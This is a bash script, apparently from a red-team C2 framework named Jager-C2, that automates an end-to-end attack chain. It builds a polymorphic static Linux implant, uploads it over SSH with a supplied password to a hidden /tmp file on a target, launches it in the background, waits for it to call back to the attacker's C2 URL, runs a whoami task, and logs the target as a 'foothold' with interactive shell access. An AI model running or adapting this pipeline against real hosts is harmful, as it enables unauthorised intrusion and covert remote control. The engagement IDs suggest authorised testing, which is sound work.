#!/usr/bin/env bash
# Full E2E pipeline: build -> deploy -> callback -> execute -> evidence -> foothold
# Usage:
#   c2-e2e-pipeline.sh --target <ip> --ssh-user <user> --ssh-pass <pass> [--c2-url <url>]
#                       [--ts-url <url>] [--engagement <id>] [--timeout <secs>]
#
# Requires: teamserver already running (or use --start-ts to launch one).
set -euo pipefail

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
PROJECT_DIR="$(dirname "$SCRIPT_DIR")"
REPO_ROOT="$PROJECT_DIR"

# Defaults
TARGET_IP=""
SSH_USER=""
SSH_PASS=""
C2_URL=""
TS_URL="${JAGER_MGMT_URL:-http://127.0.0.1:31338}"
ENGAGEMENT="${JAGER_ENGAGEMENT:-ENG-e2e-test}"
CALLBACK_TIMEOUT=60
START_TS=0
LISTENER_PORT=443
EVIDENCE_DIR="${REPO_ROOT}/evidence/c2"

API_KEY="${JAGER_MGMT_API_KEY:-}"
API_KEY_FILE="${PROJECT_DIR}/data/api-key.txt"

PASS=0
FAIL=0
STEP=0
FAILED_STEPS=()

TS_PID=""
BUILD_ID=""
BUILD_PATH=""
SESSION_ID=""

log()  { echo "[$(date +%H:%M:%S)] $*"; }
pass() { PASS=$((PASS + 1)); log "PASS: $1"; }
fail() { FAIL=$((FAIL + 1)); FAILED_STEPS+=("$1"); log "FAIL: $1"; }

step() {
    STEP=$((STEP + 1))
    echo ""
    log "=== Step $STEP: $1 ==="
}

ts_get() {
    local path="$1"
    curl -sf "${AUTH_HEADER[@]}" "$TS_URL$path" 2>/dev/null || echo '{"error":"request failed"}'
}

ts_post() {
    local path="$1" body="$2"
    curl -sf -X POST "${AUTH_HEADER[@]}" -H "Content-Type: application/json" \
        -d "$body" "$TS_URL$path" 2>/dev/null || echo '{"error":"request failed"}'
}

json_field() {
    python3 -c "import sys,json; print(json.load(sys.stdin).get('$1',''))" 2>/dev/null
}

cleanup() {
    if [ -n "$TS_PID" ]; then
        log "Stopping embedded teamserver (pid=$TS_PID)..."
        kill "$TS_PID" 2>/dev/null || true
        wait "$TS_PID" 2>/dev/null || true
    fi
}
trap cleanup EXIT

usage() {
    echo "Usage: $0 --target <ip> --ssh-user <user> --ssh-pass <pass> [options]"
    echo ""
    echo "Required:"
    echo "  --target       Target IP to deploy implant to"
    echo "  --ssh-user     SSH username for deployment"
    echo "  --ssh-pass     SSH password for deployment"
    echo ""
    echo "Optional:"
    echo "  --c2-url       C2 callback URL (default: https://<attacker-ip>:443)"
    echo "  --ts-url       Teamserver management URL (default: \$JAGER_MGMT_URL or http://127.0.0.1:31338)"
    echo "  --engagement   Engagement ID (default: ENG-e2e-test)"
    echo "  --timeout      Callback timeout in seconds (default: 60)"
    echo "  --start-ts     Start an embedded teamserver"
    echo "  --listener     Listener port (default: 443)"
    exit 1
}

while [[ $# -gt 0 ]]; do
    case "$1" in
        --target)       TARGET_IP="$2"; shift 2 ;;
        --ssh-user)     SSH_USER="$2"; shift 2 ;;
        --ssh-pass)     SSH_PASS="$2"; shift 2 ;;
        --c2-url)       C2_URL="$2"; shift 2 ;;
        --ts-url)       TS_URL="$2"; shift 2 ;;
        --engagement)   ENGAGEMENT="$2"; shift 2 ;;
        --timeout)      CALLBACK_TIMEOUT="$2"; shift 2 ;;
        --start-ts)     START_TS=1; shift ;;
        --listener)     LISTENER_PORT="$2"; shift 2 ;;
        *)              echo "Unknown option: $1"; usage ;;
    esac
done

if [ -z "$TARGET_IP" ] || [ -z "$SSH_USER" ] || [ -z "$SSH_PASS" ]; then
    usage
fi

if [ -z "$C2_URL" ]; then
    ATTACKER_IP=$(ip route get "$TARGET_IP" 2>/dev/null | awk '/src/{print $NF; exit}')
    if [ -z "$ATTACKER_IP" ]; then
        ATTACKER_IP="$(hostname -I | awk '{print $1}')"
    fi
    C2_URL="https://${ATTACKER_IP}:${LISTENER_PORT}"
fi

echo "============================================="
echo "  Jager-C2 E2E Pipeline"
echo "============================================="
echo "  Target:      $TARGET_IP"
echo "  SSH User:    $SSH_USER"
echo "  C2 URL:      $C2_URL"
echo "  TS URL:      $TS_URL"
echo "  Engagement:  $ENGAGEMENT"
echo "  Timeout:     ${CALLBACK_TIMEOUT}s"
echo "============================================="

# Load API key
if [ -z "$API_KEY" ] && [ -f "$API_KEY_FILE" ]; then
    API_KEY="$(cat "$API_KEY_FILE")"
fi
AUTH_HEADER=()
if [ -n "$API_KEY" ]; then
    AUTH_HEADER=(-H "X-Jager-C2-Api-Key: $API_KEY")
fi

# ---------------------------------------------------------------------------
# Step 1: Teamserver + Listener
# ---------------------------------------------------------------------------
step "Teamserver health + listener"

if [ "$START_TS" -eq 1 ]; then
    TEAMSERVER="$PROJECT_DIR/bin/jager-server"
    if [ ! -x "$TEAMSERVER" ]; then
        log "Building teamserver..."
        (cd "$PROJECT_DIR/teamserver" && go build -o "$TEAMSERVER" ./cmd/jager-server)
    fi
    log "Starting embedded teamserver..."
    mkdir -p "$PROJECT_DIR/data"
    "$TEAMSERVER" --workspace "$REPO_ROOT" > "$PROJECT_DIR/data/e2e-pipeline.log" 2>&1 &
    TS_PID=$!
    sleep 3
    if [ -z "$API_KEY" ] && [ -f "$API_KEY_FILE" ]; then
        API_KEY="$(cat "$API_KEY_FILE")"
        AUTH_HEADER=(-H "X-Jager-C2-Api-Key: $API_KEY")
    fi
fi

HTTP_CODE=$(curl -so /dev/null -w "%{http_code}" "${AUTH_HEADER[@]}" "$TS_URL/mgmt/ping" 2>/dev/null || echo "000")
if [ "$HTTP_CODE" = "200" ]; then
    pass "Teamserver reachable (HTTP $HTTP_CODE)"
else
    fail "Teamserver unreachable (HTTP $HTTP_CODE)"
    log "Cannot continue without teamserver. Aborting."
    exit 1
fi

LISTENER_RESP=$(ts_post "/mgmt/listener/start" "{\"bind_port\":$LISTENER_PORT}")
LISTENER_ERR=$(echo "$LISTENER_RESP" | json_field error)
if [ -z "$LISTENER_ERR" ] || echo "$LISTENER_ERR" | grep -qi "already"; then
    pass "Listener on port $LISTENER_PORT"
else
    fail "Listener start: $LISTENER_ERR"
fi

# ---------------------------------------------------------------------------
# Step 2: Build Linux ELF (static)
# ---------------------------------------------------------------------------
step "Build Linux ELF (static)"

BUILD_RESP=$(ts_post "/mgmt/build/implant" \
    "{\"c2_url\":\"$C2_URL\",\"format\":\"elf\",\"arch\":\"x64\",\"platform\":\"linux\",\"polymorphic\":true,\"engagement_id\":\"$ENGAGEMENT\",\"sleep\":30,\"jitter\":15}")

BUILD_ID=$(echo "$BUILD_RESP" | python3 -c "import sys,json;d=json.load(sys.stdin);print(d.get('build_id',d.get('implant',{}).get('build_id','')))" 2>/dev/null || true)
BUILD_PATH=$(echo "$BUILD_RESP" | python3 -c "import sys,json;d=json.load(sys.stdin);print(d.get('implant',{}).get('path',d.get('path','')))" 2>/dev/null || true)
BUILD_SUCCESS=$(echo "$BUILD_RESP" | json_field success)

if [ "$BUILD_SUCCESS" = "True" ] || [ "$BUILD_SUCCESS" = "true" ]; then
    pass "Implant built: $BUILD_ID"
else
    BUILD_ERR=$(echo "$BUILD_RESP" | json_field error)
    fail "Build failed: ${BUILD_ERR:-unknown}"
    log "Cannot continue without implant. Aborting."
    exit 1
fi

# Verify with file + readelf
if [ -n "$BUILD_PATH" ] && [ -f "$BUILD_PATH" ]; then
    FILE_TYPE=$(file -b "$BUILD_PATH")
    if echo "$FILE_TYPE" | grep -q "ELF.*static"; then
        pass "file(1) confirms static ELF"
    elif echo "$FILE_TYPE" | grep -q "ELF"; then
        log "WARN: file(1) says: $FILE_TYPE"
        pass "file(1) confirms ELF (static flag may be implicit)"
    else
        fail "file(1): unexpected type: $FILE_TYPE"
    fi

    DYNAMIC_LIBS=$(readelf -d "$BUILD_PATH" 2>/dev/null | grep -c "NEEDED" || true)
    if [ "$DYNAMIC_LIBS" -eq 0 ]; then
        pass "readelf: no NEEDED entries (fully static)"
    else
        fail "readelf: $DYNAMIC_LIBS NEEDED entries found (not fully static)"
    fi
else
    fail "Build artifact not found at: ${BUILD_PATH:-<empty>}"
fi

# ---------------------------------------------------------------------------
# Step 3: Deploy to target via SCP
# ---------------------------------------------------------------------------
step "Deploy implant to $TARGET_IP"

REMOTE_PATH="/tmp/.$(head -c6 /dev/urandom | xxd -p)"
SSH_OPTS=(-o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=10 -o LogLevel=ERROR)

if [ -z "$BUILD_PATH" ] || [ ! -f "$BUILD_PATH" ]; then
    fail "No build artifact to deploy"
else
    if sshpass -p "$SSH_PASS" scp "${SSH_OPTS[@]}" "$BUILD_PATH" "$SSH_USER@$TARGET_IP:$REMOTE_PATH" 2>/dev/null; then
        pass "SCP upload to $TARGET_IP:$REMOTE_PATH"
    else
        fail "SCP upload failed"
        log "Cannot continue without deployment. Aborting."
        exit 1
    fi

    # chmod + exec in background
    sshpass -p "$SSH_PASS" ssh "${SSH_OPTS[@]}" "$SSH_USER@$TARGET_IP" \
        "chmod +x '$REMOTE_PATH' && nohup '$REMOTE_PATH' > /dev/null 2>&1 &" 2>/dev/null || true
    pass "Implant launched on target"
fi

# ---------------------------------------------------------------------------
# Step 4: Wait for implant callback + session
# ---------------------------------------------------------------------------
step "Wait for implant callback (timeout=${CALLBACK_TIMEOUT}s)"

WAITED=0
POLL_INTERVAL=5
while [ "$WAITED" -lt "$CALLBACK_TIMEOUT" ]; do
    SESSIONS_RESP=$(ts_get "/mgmt/sessions")
    SESSION_ID=$(echo "$SESSIONS_RESP" | python3 -c "
import sys, json
data = json.load(sys.stdin)
sessions = data if isinstance(data, list) else data.get('sessions', [])
for s in sessions:
    sid = s.get('id', s.get('session_id', ''))
    ip = s.get('remote_ip', s.get('ip', ''))
    if '$TARGET_IP' in ip:
        print(sid)
        break
" 2>/dev/null || true)

    if [ -n "$SESSION_ID" ]; then
        break
    fi
    sleep "$POLL_INTERVAL"
    WAITED=$((WAITED + POLL_INTERVAL))
    log "Waiting... ${WAITED}s / ${CALLBACK_TIMEOUT}s"
done

if [ -n "$SESSION_ID" ]; then
    pass "Session registered: $SESSION_ID (from $TARGET_IP)"
else
    fail "No callback from $TARGET_IP within ${CALLBACK_TIMEOUT}s"
    log "Cannot continue without session. Aborting."
    exit 1
fi

# ---------------------------------------------------------------------------
# Step 5: Task dispatch + result verification
# ---------------------------------------------------------------------------
step "Task dispatch (whoami)"

TASK_RESP=$(ts_post "/mgmt/task" "{\"session_id\":\"$SESSION_ID\",\"task_type\":10,\"data\":\"d2hvYW1p\"}")
TASK_ID=$(echo "$TASK_RESP" | json_field task_id)

if [ -z "$TASK_ID" ] || [ "$TASK_ID" = "" ]; then
    fail "Task queue failed"
else
    log "Task queued: $TASK_ID, waiting for result..."
    # Wait for task result
    TASK_RESULT=""
    TASK_WAITED=0
    TASK_TIMEOUT=90
    while [ "$TASK_WAITED" -lt "$TASK_TIMEOUT" ]; do
        RESULT_RESP=$(ts_get "/mgmt/task/wait?task_id=$TASK_ID&timeout=5")
        TASK_OUTPUT=$(echo "$RESULT_RESP" | python3 -c "
import sys, json, base64
d = json.load(sys.stdin)
out = d.get('output', d.get('result', ''))
if out:
    try:
        print(base64.b64decode(out).decode(errors='replace'))
    except Exception:
        print(out)
" 2>/dev/null || true)
        TASK_STATUS=$(echo "$RESULT_RESP" | json_field status)

        if [ -n "$TASK_OUTPUT" ]; then
            TASK_RESULT="$TASK_OUTPUT"
            break
        fi
        if [ "$TASK_STATUS" = "complete" ] || [ "$TASK_STATUS" = "completed" ]; then
            TASK_RESULT="(completed, empty output)"
            break
        fi
        TASK_WAITED=$((TASK_WAITED + 5))
    done

    if [ -n "$TASK_RESULT" ]; then
        log "whoami output: $TASK_RESULT"
        pass "Task execution: whoami returned output"
    else
        fail "Task execution: no result within ${TASK_TIMEOUT}s"
    fi
fi

# ---------------------------------------------------------------------------
# Step 6: Evidence capture
# ---------------------------------------------------------------------------
step "Evidence capture"

mkdir -p "$EVIDENCE_DIR"

EVIDENCE_FILE="$EVIDENCE_DIR/e2e-${ENGAGEMENT}-$(date +%Y%m%d-%H%M%S).json"
python3 -c "
import json, sys
evidence = {
    'type': 'c2_e2e_validation',
    'engagement': '$ENGAGEMENT',
    'target': '$TARGET_IP',
    'build_id': '$BUILD_ID',
    'session_id': '$SESSION_ID',
    'task_result': '''$TASK_RESULT'''.strip(),
    'timestamp': '$(date -u +%Y-%m-%dT%H:%M:%SZ)',
    'c2_url': '$C2_URL',
    'steps_passed': $PASS,
    'steps_failed': $FAIL
}
with open('$EVIDENCE_FILE', 'w') as f:
    json.dump(evidence, f, indent=2)
print('OK')
" 2>/dev/null

if [ -f "$EVIDENCE_FILE" ]; then
    pass "Evidence saved: $EVIDENCE_FILE"
else
    fail "Evidence capture failed"
fi

# ---------------------------------------------------------------------------
# Step 7: Foothold registration
# ---------------------------------------------------------------------------
step "Foothold registration"

FOOTHOLD_FILE="$REPO_ROOT/data/footholds/footholds.json"
if [ -f "$FOOTHOLD_FILE" ]; then
    python3 -c "
import json
with open('$FOOTHOLD_FILE') as f:
    footholds = json.load(f)
existing = [fh for fh in footholds if fh.get('ip') == '$TARGET_IP' and fh.get('type') == 'c2']
if existing:
    print('ALREADY')
else:
    footholds.append({
        'ip': '$TARGET_IP',
        'type': 'c2',
        'session_id': '$SESSION_ID',
        'build_id': '$BUILD_ID',
        'engagement': '$ENGAGEMENT',
        'established': '$(date -u +%Y-%m-%dT%H:%M:%SZ)',
        'access': 'interactive_shell',
        'notes': 'E2E pipeline validated'
    })
    with open('$FOOTHOLD_FILE', 'w') as f:
        json.dump(footholds, f, indent=2)
    print('ADDED')
" 2>/dev/null | {
        read -r status
        if [ "$status" = "ADDED" ]; then
            pass "Foothold registered for $TARGET_IP (c2)"
        elif [ "$status" = "ALREADY" ]; then
            pass "Foothold already registered for $TARGET_IP"
        else
            fail "Foothold registration failed"
        fi
    }
else
    log "No footholds file found, creating..."
    mkdir -p "$(dirname "$FOOTHOLD_FILE")"
    python3 -c "
import json
footholds = [{
    'ip': '$TARGET_IP',
    'type': 'c2',
    'session_id': '$SESSION_ID',
    'build_id': '$BUILD_ID',
    'engagement': '$ENGAGEMENT',
    'established': '$(date -u +%Y-%m-%dT%H:%M:%SZ)',
    'access': 'interactive_shell',
    'notes': 'E2E pipeline validated'
}]
with open('$FOOTHOLD_FILE', 'w') as f:
    json.dump(footholds, f, indent=2)
print('OK')
" 2>/dev/null
    pass "Foothold file created with $TARGET_IP (c2)"
fi

# ---------------------------------------------------------------------------
# Summary
# ---------------------------------------------------------------------------
echo ""
echo "============================================="
echo "  E2E Pipeline Results"
echo "============================================="
echo "  Passed: $PASS"
echo "  Failed: $FAIL"
if [ "$FAIL" -gt 0 ]; then
    echo "  Failed steps:"
    for s in "${FAILED_STEPS[@]}"; do
        echo "    - $s"
    done
fi
echo "============================================="

exit $([ "$FAIL" -eq 0 ] && echo 0 || echo 1)
